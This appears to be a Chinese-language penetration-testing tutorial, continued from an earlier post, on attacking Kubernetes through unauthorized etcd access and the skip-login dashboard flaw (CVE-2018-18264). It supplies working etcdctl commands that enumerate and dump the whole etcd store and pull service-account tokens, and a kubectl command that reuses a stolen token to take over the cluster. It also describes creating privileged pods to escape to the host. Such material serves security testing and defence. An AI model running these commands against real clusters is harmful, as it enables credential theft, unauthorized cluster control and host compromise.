> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OqduKs6OeYEErWNwtke2rA)

接上文：[https://mp.weixin.qq.com/s/ukm64QJ1yytKNpwRBeP6sg](https://mp.weixin.qq.com/s?__biz=Mzg3OTEwMzIzNA==&mid=2247484334&idx=1&sn=1e6fe1e52364e2b560de37700d124e16&scene=21#wechat_redirect)

### 3. etcd 未授权访问

etcd 默认监听了`2379`等端口，如果 2379 端口暴露到公网，可能造成敏感信息泄露。**etcd 若存在未授权，攻击者导出全量 etcd 配置，获取 k8s 认证证书等关键配置**，进而通过 kubectl 创建恶意 pod 或控制已有 pod，后续可尝试逃逸至宿主机。

访问 https://IP:2379/v2/keys，有内容，类似 {“action”:“get”,“node”:{“dir”:true}} 这样的，就确定存在未授权访问。

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX44wic6fg3ia1OJTcAkkTZmpNRJ3I03cukgLxkKBI6cnaq96k5f00ry8MajLPgKvgcZhvZX9XASgfQ/640?wx_fmt=png)

https://github.com/etcd-io/etcd/releases/ 下载 得到 etcdctl

通过如下命令可以遍历所有的 key：

```
export ETCDCTL_API=3

./etcdctl --endpoints=http://IP:2379/ get / --prefix --keys-only

# 服务器启用了https

./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379/ get / --prefix --keys-only

```

下面的命令，通过 v3 API 来 dump 数据库到 output.data：

```
ETCDCTL_API=3
./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379/ get / --prefix --keys-only | sort | uniq | xargs -I{} sh -c 'ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379 get {} >> output.data && echo "" >> output.data'

# 比如获取具体的token

etcdctl.exe --endpoints="10.10.10.10:2379" get /register/secrets/kube-system/clusterrole-xxx-xxx-token-o4dk9

```

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX44wic6fg3ia1OJTcAkkTZmpGwk0a80HmaWAPbrtFyV5MFicbs3MA0neddyicaAMTUQO5wFZMGUiaHhxg/640?wx_fmt=png)

拿到 token 后跟之前一样创建`test_config`控制集群，也可以直接使用 token：

```
./kubectl --insecure-skip-tls-verify -s https://10.10.10.10:6443 get pods --token="eyJhbGxxxxx"

```

### 4. dashboard 未授权访问（CVE-2018-18264）

k8s dashboard 的`enable-skip-login`开启时，登录页面可选择跳过登录：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX44wic6fg3ia1OJTcAkkTZmpJHic5tkbWiaexV42wxuu1n1Vk5icZhd6JQPsqA3l8EaiaMXCzGzVGicUnCw/640?wx_fmt=png)

登录后，可通过 dashboard 获取 pod、node 和 job 等状态。

在安装 dashboard 的时候，会默认建立 dashboard-admin 账号并且分配 cluster-admin 的角色：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX44wic6fg3ia1OJTcAkkTZmpdRF6RGgSjCJpvEPZGEKDpscdn3WxdaFTk7icsiax837yQBy7m7F4CoUw/640?wx_fmt=png)

因此在 kube-system 中找到关键字 admin 的账号 token 就能登录 dashboard 后台：

![](https://mmbiz.qpic.cn/mmbiz_png/ibq2PfPib58XX44wic6fg3ia1OJTcAkkTZmpBA5icwoF10w6wnMnx96kLlTkTGWVMl7m6nV8z1XJIhU9rWLRXM572LA/640?wx_fmt=png)

若业务配置错误或为了方便给 Kubernetes dashboard 绑定 cluster-admin 等角色，攻击者可直接在界面上创建特权 pod 进行容器逃逸。

### 参考链接

[https://mp.weixin.qq.com/s/T2QGLlKwjaUByDtGFL94PQ](https://mp.weixin.qq.com/s?__biz=MzIxNTIzMzM1Ng==&mid=2651104364&idx=1&sn=a22dac0da090751552d46a8b622bfbbc&scene=21#wechat_redirect)

https://blog.csdn.net/w1590191166/article/details/122028001?spm=1001.2014.3001.5501